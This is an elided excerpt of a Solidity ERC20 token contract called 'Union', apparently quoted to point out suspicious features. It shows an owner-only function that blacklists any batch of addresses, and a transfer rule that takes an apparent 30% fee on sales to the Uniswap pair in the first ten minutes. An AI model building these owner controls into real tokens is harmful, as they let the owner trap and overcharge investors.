...
contract Union is ERC20 {
    ...
    constructor(address tokenOwner) ERC20("Union", "UK")  {
    ...
    function batChangeBad(address[] calldata accounts, bool isBack)
    public
    onlyOwner
    returns (bool)
    {
        for (uint256 i = 0; i < accounts.length; i++) {
            blackList[accounts[i]] = isBack;
        }
        return true;
    }
    ...
    function _transfer(
        ...
        if (takeFee) {
            ...
            if (recipient == uniswapV2Pair && 10 * 60 + startTime > block.timestamp && !isDelLdx) {
                marketPercent = 3000;
            }
